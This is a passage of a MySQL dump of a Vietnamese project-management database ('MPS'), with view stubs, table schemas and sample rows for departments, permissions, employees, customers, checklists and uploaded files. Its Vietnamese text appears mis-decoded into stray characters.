-- MySQL dump 10.13  Distrib 8.0.25, for Linux (x86_64)
--
-- Host: localhost    Database: MPS
-- ------------------------------------------------------
-- Server version	8.0.25

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Temporary view structure for view `View_Employee_Department`
--

DROP TABLE IF EXISTS `View_Employee_Department`;
/*!50001 DROP VIEW IF EXISTS `View_Employee_Department`*/;
SET @saved_cs_client     = @@character_set_client;
/*!50503 SET character_set_client = utf8mb4 */;
/*!50001 CREATE VIEW `View_Employee_Department` AS SELECT 
 1 AS `DepartmentID`,
 1 AS `DepartmentName`,
 1 AS `CreatedBy`,
 1 AS `CreatedDate`,
 1 AS `EmployeeID`,
 1 AS `EmployeeCode`,
 1 AS `FullName`,
 1 AS `Email`,
 1 AS `PositionName`,
 1 AS `StructureID`,
 1 AS `Avatar`,
 1 AS `ProjectID`,
 1 AS `ProjectName`,
 1 AS `PermissionGroupID`*/;
SET character_set_client = @saved_cs_client;

--
-- Temporary view structure for view `View_Employee_Info`
--

DROP TABLE IF EXISTS `View_Employee_Info`;
/*!50001 DROP VIEW IF EXISTS `View_Employee_Info`*/;
SET @saved_cs_client     = @@character_set_client;
/*!50503 SET character_set_client = utf8mb4 */;
/*!50001 CREATE VIEW `View_Employee_Info` AS SELECT 
 1 AS `EmployeeID`,
 1 AS `EmployeeCode`,
 1 AS `FullName`,
 1 AS `Email`,
 1 AS `PositionName`,
 1 AS `StructureID`,
 1 AS `Avatar`,
 1 AS `UserID`*/;
SET character_set_client = @saved_cs_client;

--
-- Temporary view structure for view `View_Issue_Project`
--

DROP TABLE IF EXISTS `View_Issue_Project`;
/*!50001 DROP VIEW IF EXISTS `View_Issue_Project`*/;
SET @saved_cs_client     = @@character_set_client;
/*!50503 SET character_set_client = utf8mb4 */;
/*!50001 CREATE VIEW `View_Issue_Project` AS SELECT 
 1 AS `IssueID`,
 1 AS `IssueKey`,
 1 AS `IssueName`,
 1 AS `Description`,
 1 AS `CustomerInfoID`,
 1 AS `ReceptionDate`,
 1 AS `CreatorID`,
 1 AS `AssigneeID`,
 1 AS `CreatedDate`,
 1 AS `ModifiedDate`,
 1 AS `DesiredDate`,
 1 AS `IssueStatus`,
 1 AS `SolutionID`,
 1 AS `PreliminarySolution`,
 1 AS `ProjectID`,
 1 AS `ProjectVersionID`,
 1 AS `IssueTypeID`,
 1 AS `Priority`,
 1 AS `CreatorName`,
 1 AS `CreatorCode`,
 1 AS `CreatorAvatar`,
 1 AS `AssigneeName`,
 1 AS `AssigneeAvatar`,
 1 AS `AssigneeCode`,
 1 AS `CustomerPhoneNumber`,
 1 AS `CustomerEmail`,
 1 AS `CustomerContactInfo`,
 1 AS `IssueTypeName`,
 1 AS `IssueTypeAvatar`,
 1 AS `IssueTypeDescription`,
 1 AS `SolutionName`*/;
SET character_set_client = @saved_cs_client;

--
-- Temporary view structure for view `View_Post_Project`
--

DROP TABLE IF EXISTS `View_Post_Project`;
/*!50001 DROP VIEW IF EXISTS `View_Post_Project`*/;
SET @saved_cs_client     = @@character_set_client;
/*!50503 SET character_set_client = utf8mb4 */;
/*!50001 CREATE VIEW `View_Post_Project` AS SELECT 
 1 AS `PostID`,
 1 AS `ProjectID`,
 1 AS `AuthorID`,
 1 AS `Content`,
 1 AS `PostCategoryID`,
 1 AS `CreatedDate`,
 1 AS `ModifiedDate`,
 1 AS `Title`,
 1 AS `AuthorCode`,
 1 AS `AuthorName`,
 1 AS `AuthorAvatar`,
 1 AS `PostCategoryName`*/;
SET character_set_client = @saved_cs_client;

--
-- Temporary view structure for view `View_Subtask`
--

DROP TABLE IF EXISTS `View_Subtask`;
/*!50001 DROP VIEW IF EXISTS `View_Subtask`*/;
SET @saved_cs_client     = @@character_set_client;
/*!50503 SET character_set_client = utf8mb4 */;
/*!50001 CREATE VIEW `View_Subtask` AS SELECT 
 1 AS `TaskID`,
 1 AS `TaskName`,
 1 AS `Description`,
 1 AS `StartDate`,
 1 AS `EndDate`,
 1 AS `ProjectID`,
 1 AS `CreatedDate`,
 1 AS `CreatorID`,
 1 AS `TaskGroupID`,
 1 AS `Progress`,
 1 AS `ParentID`,
 1 AS `PerformerID`,
 1 AS `Status`,
 1 AS `CreatorName`,
 1 AS `TaskGroupName`,
 1 AS `PerformerName`,
 1 AS `PerformerAvatar`,
 1 AS `CreatorAvatar`*/;
SET character_set_client = @saved_cs_client;

--
-- Temporary view structure for view `View_Task_Phase`
--

DROP TABLE IF EXISTS `View_Task_Phase`;
/*!50001 DROP VIEW IF EXISTS `View_Task_Phase`*/;
SET @saved_cs_client     = @@character_set_client;
/*!50503 SET character_set_client = utf8mb4 */;
/*!50001 CREATE VIEW `View_Task_Phase` AS SELECT 
 1 AS `PhaseID`,
 1 AS `PhaseDescription`,
 1 AS `PhaseName`,
 1 AS `TaskID`,
 1 AS `TaskName`,
 1 AS `Description`,
 1 AS `StartDate`,
 1 AS `EndDate`,
 1 AS `ProjectID`,
 1 AS `CreatedDate`,
 1 AS `CreatorID`,
 1 AS `TaskGroupID`,
 1 AS `Progress`,
 1 AS `ParentID`,
 1 AS `PerformerID`,
 1 AS `Status`,
 1 AS `FinishDate`,
 1 AS `AssignorID`,
 1 AS `Active`*/;
SET character_set_client = @saved_cs_client;

--
-- Temporary view structure for view `View_Task_Project`
--

DROP TABLE IF EXISTS `View_Task_Project`;
/*!50001 DROP VIEW IF EXISTS `View_Task_Project`*/;
SET @saved_cs_client     = @@character_set_client;
/*!50503 SET character_set_client = utf8mb4 */;
/*!50001 CREATE VIEW `View_Task_Project` AS SELECT 
 1 AS `TaskID`,
 1 AS `TaskName`,
 1 AS `Description`,
 1 AS `StartDate`,
 1 AS `EndDate`,
 1 AS `ProjectID`,
 1 AS `CreatedDate`,
 1 AS `CreatorID`,
 1 AS `TaskGroupID`,
 1 AS `Progress`,
 1 AS `ParentID`,
 1 AS `PerformerID`,
 1 AS `Status`,
 1 AS `FinishDate`,
 1 AS `AssignorID`,
 1 AS `Active`,
 1 AS `CreatorName`,
 1 AS `TaskGroupName`,
 1 AS `PerformerName`,
 1 AS `PerformerAvatar`,
 1 AS `AssignorName`,
 1 AS `CreatorAvatar`*/;
SET character_set_client = @saved_cs_client;

--
-- Temporary view structure for view `View_Watcher_Issue`
--

DROP TABLE IF EXISTS `View_Watcher_Issue`;
/*!50001 DROP VIEW IF EXISTS `View_Watcher_Issue`*/;
SET @saved_cs_client     = @@character_set_client;
/*!50503 SET character_set_client = utf8mb4 */;
/*!50001 CREATE VIEW `View_Watcher_Issue` AS SELECT 
 1 AS `WatcherID`,
 1 AS `IssueID`,
 1 AS `IssueKey`,
 1 AS `IssueName`,
 1 AS `Description`,
 1 AS `CustomerInfoID`,
 1 AS `ReceptionDate`,
 1 AS `CreatorID`,
 1 AS `AssigneeID`,
 1 AS `CreatedDate`,
 1 AS `ModifiedDate`,
 1 AS `DesiredDate`,
 1 AS `IssueStatus`,
 1 AS `SolutionID`,
 1 AS `PreliminarySolution`,
 1 AS `ProjectID`,
 1 AS `ProjectVersionID`,
 1 AS `IssueTypeID`,
 1 AS `Priority`,
 1 AS `CreatorName`,
 1 AS `CreatorCode`,
 1 AS `CreatorAvatar`,
 1 AS `AssigneeName`,
 1 AS `AssigneeAvatar`,
 1 AS `AssigneeCode`,
 1 AS `CustomerPhoneNumber`,
 1 AS `CustomerEmail`,
 1 AS `CustomerContactInfo`,
 1 AS `IssueTypeName`,
 1 AS `IssueTypeAvatar`,
 1 AS `IssueTypeDescription`,
 1 AS `SolutionName`*/;
SET character_set_client = @saved_cs_client;

--
-- Temporary view structure for view `View_Watcher_Post`
--

DROP TABLE IF EXISTS `View_Watcher_Post`;
/*!50001 DROP VIEW IF EXISTS `View_Watcher_Post`*/;
SET @saved_cs_client     = @@character_set_client;
/*!50503 SET character_set_client = utf8mb4 */;
/*!50001 CREATE VIEW `View_Watcher_Post` AS SELECT 
 1 AS `WatcherID`,
 1 AS `PostID`,
 1 AS `ProjectID`,
 1 AS `AuthorID`,
 1 AS `Content`,
 1 AS `PostCategoryID`,
 1 AS `CreatedDate`,
 1 AS `ModifiedDate`,
 1 AS `Title`,
 1 AS `AuthorCode`,
 1 AS `AuthorName`,
 1 AS `AuthorAvatar`,
 1 AS `PostCategoryName`*/;
SET character_set_client = @saved_cs_client;

--
-- Table structure for table `checklist`
--

DROP TABLE IF EXISTS `checklist`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `checklist` (
  `ChecklistID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `ChecklistName` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Index` int DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `TaskID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`ChecklistID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng c├íc checklist';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `checklist`
--

LOCK TABLES `checklist` WRITE;
/*!40000 ALTER TABLE `checklist` DISABLE KEYS */;
INSERT INTO `checklist` VALUES ('18528b60-1de5-11ee-9bbf-0242ac130002','Thß╗▒c hiß╗çn ─æi l├ám',1,'2023-07-09 06:13:48',NULL,'e124ae7b-a520-474d-8dee-58c88d4181ec'),('188e1d69-15ca-11ee-852c-0242ac130002','─Éi chß╗ú',1,'2023-06-28 15:40:23',NULL,'a5e2d757-5795-4adb-a2f6-c594f8287a05'),('18918a66-15ca-11ee-852c-0242ac130002','Ch╞íi game',2,'2023-06-28 15:40:23',NULL,'a5e2d757-5795-4adb-a2f6-c594f8287a05'),('227e833b-5a8b-45a8-a60d-615fce4f8594','Check list',NULL,'2023-08-10 12:38:21','B-1179','8ca6d2b0-f508-4f98-bb7f-b7f6290869c1'),('2ed928c8-15c7-11ee-852c-0242ac130002','Thß╗▒c hiß╗çn',NULL,'2023-06-28 15:19:32',NULL,NULL),('918fd79b-3001-11ee-a453-0242ac130002','Thß╗▒c hiß╗çn nß╗Öi dung c├┤ng viß╗çc A',1,'2023-08-01 07:22:59',NULL,'274ceabd-5eda-4992-93e2-0a4c4c8e2045'),('9194325a-3001-11ee-a453-0242ac130002','Kiß╗âm tra tr╞░ß╗¢c khi ho├án th├ánh',2,'2023-08-01 07:22:59',NULL,'274ceabd-5eda-4992-93e2-0a4c4c8e2045'),('fba817d6-9346-4e72-b092-1953542368a1',NULL,NULL,'2023-08-10 17:25:40','B-1179',NULL);
/*!40000 ALTER TABLE `checklist` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `customerinfo`
--

DROP TABLE IF EXISTS `customerinfo`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `customerinfo` (
  `CustomerInfoID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `CustomerName` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `PhoneNumber` varchar(20) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `IssueID` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `Email` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ContactInfo` text COLLATE utf8mb4_unicode_ci,
  PRIMARY KEY (`CustomerInfoID`),
  KEY `FK_customerinfo_IssueID` (`IssueID`),
  CONSTRAINT `FK_customerinfo_IssueID` FOREIGN KEY (`IssueID`) REFERENCES `issue` (`IssueID`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng kh├ích h├áng gß║╖p sß╗▒ cß╗æ';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `customerinfo`
--

LOCK TABLES `customerinfo` WRITE;
/*!40000 ALTER TABLE `customerinfo` DISABLE KEYS */;
INSERT INTO `customerinfo` VALUES ('3628e794-f609-4e83-be12-2e438a2665f2',NULL,'0332390723','fedb973b-aca6-4573-8819-ad4f2b6d767e','a@gmail.com','T├¬n ─æ╞ín vß╗ï: \nM├ú kh├ích h├áng: \nNg╞░ß╗¥i li├¬n hß╗ç: \nUltraView/Teamviewer: '),('a709c362-2cb1-4188-8490-d0832874f3a0',NULL,'0332224556','2c2d2c83-c45f-403e-9b8e-24678dffa8c7','gd@gmail.com','T├¬n ─æ╞ín vß╗ï: \nM├ú kh├ích h├áng: \nNg╞░ß╗¥i li├¬n hß╗ç: \nUltraView/Teamviewer: '),('aaa07588-55ec-48de-b05c-d7117ba33e72',NULL,'0344334556','e78fef95-ed90-478d-93f2-591c5df2c409','ad@gmail.com','T├¬n ─æ╞ín vß╗ï: \nM├ú kh├ích h├áng: \nNg╞░ß╗¥i li├¬n hß╗ç: \nUltraView/Teamviewer: '),('d1446854-a9a9-49e6-9c10-fa8bac3702a7',NULL,'0332390723','3fa85f64-5717-4562-b3fc-2c963f66afa6','abc@gmail.com','string'),('dcd6e555-17dc-4620-bcab-f0a6712b06f9',NULL,'0332390723','4d4099db-2bfe-4278-a665-58ddca606976','a@gmail.com','T├¬n ─æ╞ín vß╗ï: \nM├ú kh├ích h├áng: \nNg╞░ß╗¥i li├¬n hß╗ç: \nUltraView/Teamviewer: '),('eec88703-d69e-4dce-90e6-1a5c5b5db39b',NULL,'0334556778','4871313f-473a-45db-b682-90955e4c60b7','adg@gmail.com','T├¬n ─æ╞ín vß╗ï: D\nM├ú kh├ích h├áng: \nNg╞░ß╗¥i li├¬n hß╗ç: \nUltraView/Teamviewer: ');
/*!40000 ALTER TABLE `customerinfo` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `department`
--

DROP TABLE IF EXISTS `department`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `department` (
  `DepartmentID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `DepartmentName` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `CreatedBy` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `Description` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatorID` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`DepartmentID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='bß║úng th├┤ng tin ph├▓ng ban';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `department`
--

LOCK TABLES `department` WRITE;
/*!40000 ALTER TABLE `department` DISABLE KEYS */;
INSERT INTO `department` VALUES ('48404a61-1048-11ee-98af-0242ac130002','C├í nh├ón','B-1179','2023-06-06 00:00:00',NULL,NULL),('5da7a4e5-2b08-11ee-8ac5-0242ac130002','Dß╗▒ ├ín MCP','B-1179','2023-07-24 00:00:00',NULL,NULL),('706d5e46-1048-11ee-98af-0242ac130002','Khß╗æi dß╗▒ ├ín Internal','B-1179','2023-06-21 00:00:00',NULL,NULL),('e645e61a-2f8a-11ee-8c2d-0242ac130002','C├í nh├ón','B-1160','2023-07-04 00:00:00',NULL,'B-1160');
/*!40000 ALTER TABLE `department` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `department_employees`
--

DROP TABLE IF EXISTS `department_employees`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `department_employees` (
  `DepartmentEmployeeID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `EmployeeID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `DepartmentID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `PermissionGroupID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `IsInitDepartment` tinyint(1) DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`DepartmentEmployeeID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng nh├ón vi├¬n trong ph├▓ng ban';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `department_employees`
--

LOCK TABLES `department_employees` WRITE;
/*!40000 ALTER TABLE `department_employees` DISABLE KEYS */;
INSERT INTO `department_employees` VALUES ('0bbbe386-2f8b-11ee-8c2d-0242ac130002','ddc7a9f4-13b9-11ee-b55a-0242ac130002','e645e61a-2f8a-11ee-8c2d-0242ac130002','a27cf60b-2a8a-11ee-8ac5-0242ac130002',1,'2023-07-02 00:00:00','B-1160'),('4bc964bf-2b00-11ee-8ac5-0242ac130002','53da58f8-ef0d-11ed-ae2b-0242ac130002','48404a61-1048-11ee-98af-0242ac130002','a27cf60b-2a8a-11ee-8ac5-0242ac130002',1,'2023-06-25 00:00:00','B-1179'),('7d4b5d31-2b00-11ee-8ac5-0242ac130002','53da58f8-ef0d-11ed-ae2b-0242ac130002','706d5e46-1048-11ee-98af-0242ac130002','a27cf60b-2a8a-11ee-8ac5-0242ac130002',NULL,'2023-07-03 00:00:00','B-1179'),('819c76a1-2b08-11ee-8ac5-0242ac130002','53da58f8-ef0d-11ed-ae2b-0242ac130002','5da7a4e5-2b08-11ee-8ac5-0242ac130002','a27cf60b-2a8a-11ee-8ac5-0242ac130002',NULL,'2023-07-10 00:00:00','B-1179'),('b23822c8-2f8a-11ee-8c2d-0242ac130002','ddc7a9f4-13b9-11ee-b55a-0242ac130002','706d5e46-1048-11ee-98af-0242ac130002','cd913dbd-2a8a-11ee-8ac5-0242ac130002',NULL,'2023-07-03 00:00:00','B-1179');
/*!40000 ALTER TABLE `department_employees` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `departmentpermission`
--

DROP TABLE IF EXISTS `departmentpermission`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `departmentpermission` (
  `PermissionID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `Description` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `PermissionCode` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `PermissionName` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`PermissionID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng c├íc quyß╗ün cß╗ºa ph├▓ng ban';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `departmentpermission`
--

LOCK TABLES `departmentpermission` WRITE;
/*!40000 ALTER TABLE `departmentpermission` DISABLE KEYS */;
INSERT INTO `departmentpermission` VALUES ('3f1d4fb8-2a89-11ee-8ac5-0242ac130002','Xem tß║Ñt cß║ú dß╗▒ ├ín trß╗▒c thuß╗Öc','2023-07-25 00:00:00',NULL,'Department_Read_All_Project','Xem tß║Ñt cß║ú dß╗▒ ├ín trß╗▒c thuß╗Öc'),('b5d7c8b6-2a89-11ee-8ac5-0242ac130002','To├án quyß╗ün c├íc dß╗▒ ├ín trß╗▒c thuß╗Öc','2023-07-25 00:00:00',NULL,'Department_Permission_All_Project','To├án quyß╗ün c├íc dß╗▒ ├ín trß╗▒c thuß╗Öc'),('d36b49a3-2a89-11ee-8ac5-0242ac130002','Th├¬m th├ánh vi├¬n ─æ├ú c├│ trong ß╗⌐ng dß╗Ñng v├áo ph├▓ng ban','2023-07-25 00:00:00',NULL,'Department_Add_Employee','Th├¬m th├ánh vi├¬n ─æ├ú c├│ trong ß╗⌐ng dß╗Ñng v├áo ph├▓ng ban'),('e7cd7157-2a89-11ee-8ac5-0242ac130002','Thiß║┐t lß║¡p c├íc th├┤ng tin ph├▓ng ban','2023-07-25 00:00:00',NULL,'Department_Edit_Info','Thiß║┐t lß║¡p c├íc th├┤ng tin ph├▓ng ban'),('ebab840e-2a88-11ee-8ac5-0242ac130002','Th├¬m dß╗▒ ├ín trß╗▒c thuß╗Öc','2023-07-25 00:00:00',NULL,'Department_Add_Project','Th├¬m dß╗▒ ├ín trß╗▒c thuß╗Öc');
/*!40000 ALTER TABLE `departmentpermission` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `departmentpermissiongroup`
--

DROP TABLE IF EXISTS `departmentpermissiongroup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `departmentpermissiongroup` (
  `PermissionGroupID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `PermissionGroupName` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Description` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `DepartmentID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`PermissionGroupID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng c├íc nh├│m quyß╗ün trong ph├▓ng ban';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `departmentpermissiongroup`
--

LOCK TABLES `departmentpermissiongroup` WRITE;
/*!40000 ALTER TABLE `departmentpermissiongroup` DISABLE KEYS */;
INSERT INTO `departmentpermissiongroup` VALUES ('a27cf60b-2a8a-11ee-8ac5-0242ac130002','To├án quyß╗ün','To├án quyß╗ün vß╗¢i ph├▓ng ban','00000000-0000-0000-0000-000000000000',NULL,NULL),('cd913dbd-2a8a-11ee-8ac5-0242ac130002','Th├ánh vi├¬n','Th├¬m v├á theo d├╡i dß╗▒ ├ín cß╗ºa m├¼nh','00000000-0000-0000-0000-000000000000',NULL,NULL);
/*!40000 ALTER TABLE `departmentpermissiongroup` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `employee`
--

DROP TABLE IF EXISTS `employee`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `employee` (
  `EmployeeID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `EmployeeCode` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `FullName` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `Email` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `PositionName` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `StructureID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`EmployeeID`),
  UNIQUE KEY `UK_employee_EmployeeID` (`EmployeeID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng th├┤ng tin nh├ón vi├¬n';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `employee`
--

LOCK TABLES `employee` WRITE;
/*!40000 ALTER TABLE `employee` DISABLE KEYS */;
INSERT INTO `employee` VALUES ('53da58f8-ef0d-11ed-ae2b-0242ac130002','B-1179','Trß║ºn Ngß╗ìc L├óm','tnlam.software@gmail.com','Quß║ún trß╗ï vi├¬n','17f09da8-fd33-11ed-a39f-0242ac130002'),('701db6c7-31a5-11ee-bb11-0242ac130002','B-0860','Nguyß╗àn Hß╗»u Hß║úi','nhhai.software@gmail.com','Project Owner',NULL),('848e4747-13c6-11ee-b55a-0242ac130002','B-1120','─É├áo Xu├ón S╞ín','dxson.software@gmail.com','Nh├ón vi├¬n ph├ón t├¡ch nhiß╗çp vß╗Ñ',NULL),('aea2e463-31a5-11ee-bb11-0242ac130002','B-1022','Nguyß╗àn Thuß╗│ Linh','ntlinh.software@gmail.com','Nh├ón vi├¬n ch─âm s├│c  kh├ích h├áng',NULL),('ddc7a9f4-13b9-11ee-b55a-0242ac130002','B-1160','Nguyß╗àn V─ân Lß╗úi','nvloi.software@gmail.com','Lß║¡p tr├¼nh vi├¬n','276bfc92-13ba-11ee-b55a-0242ac130002');
/*!40000 ALTER TABLE `employee` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `file`
--

DROP TABLE IF EXISTS `file`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `file` (
  `FileID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `ID` char(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `FileName` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `OriginalName` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Type` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Url` varchar(1023) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Size` int DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  PRIMARY KEY (`FileID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng th├┤ng tin file';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `file`
--

LOCK TABLES `file` WRITE;
/*!40000 ALTER TABLE `file` DISABLE KEYS */;
INSERT INTO `file` VALUES ('0db927a3-1cac-11ee-9bbf-0242ac130002','ddb89a18','logo.png','logo_16465507072023.png','image/png','https://mpsstorage20.blob.core.windows.net/mpsstorage/logo_16465507072023.png',90816,'2023-07-07 16:52:58',NULL),('278b875f-3002-11ee-a453-0242ac130002','f45fc053','Desktop.png','Desktop_07270908012023.png','image/png','https://mpsstorage20.blob.core.windows.net/mpsstorage/Desktop_07270908012023.png',786941,'2023-08-01 07:27:10','B-1179'),('a268de60-2f46-11ee-8c2d-0242ac130002','306f8049','Desktop.png','Desktop_09044807312023.png','image/png','https://mpsstorage20.blob.core.windows.net/mpsstorage/Desktop_09044807312023.png',786941,'2023-07-31 09:04:51','B-1179'),('b7d20bca-2e37-11ee-84c3-0242ac130002','77ac793c','virus.png','virus_00453307302023.png','image/png','https://mpsstorage20.blob.core.windows.net/mpsstorage/virus_00453307302023.png',917,'2023-07-30 00:45:33','B-1179'),('bbe3e923-2a46-11ee-8172-0242ac130002','4ef12e48','B├ío c├ío tuß║ºn 5.docx','B├ío c├ío tuß║ºn 5_23554207242023.docx','application/vnd.openxmlformats-officedocument.wordprocessingml.document','https://mpsstorage20.blob.core.windows.net/mpsstorage/B%C3%A1o%20c%C3%A1o%20tu%E1%BA%A7n%205_23554207242023.docx',36398,'2023-07-25 00:22:58',NULL),('d64c265b-2a47-11ee-8172-0242ac130002','c898cac8','BE Architechture.asta','BE Architechture_00282807252023.asta','','https://mpsstorage20.blob.core.windows.net/mpsstorage/BE%20Architechture_00282807252023.asta',8786,'2023-07-25 00:30:52','B-1179'),('f06281ec-2f8c-11ee-8c2d-0242ac130002','63c7b8cf','Book1.xlsx','Book1_17280207312023.xlsx','application/vnd.openxmlformats-officedocument.spreadsheetml.sheet','https://mpsstorage20.blob.core.windows.net/mpsstorage/Book1_17280207312023.xlsx',9787,'2023-07-31 17:28:06','B-1179');
/*!40000 ALTER TABLE `file` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `issue`
--

DROP TABLE IF EXISTS `issue`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `issue` (
  `IssueID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `IssueKey` int unsigned NOT NULL AUTO_INCREMENT,
  `IssueName` text COLLATE utf8mb4_unicode_ci,
  `Description` text COLLATE utf8mb4_unicode_ci,
  `CustomerInfoID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ReceptionDate` datetime DEFAULT NULL,
  `CreatorID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `AssigneeID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
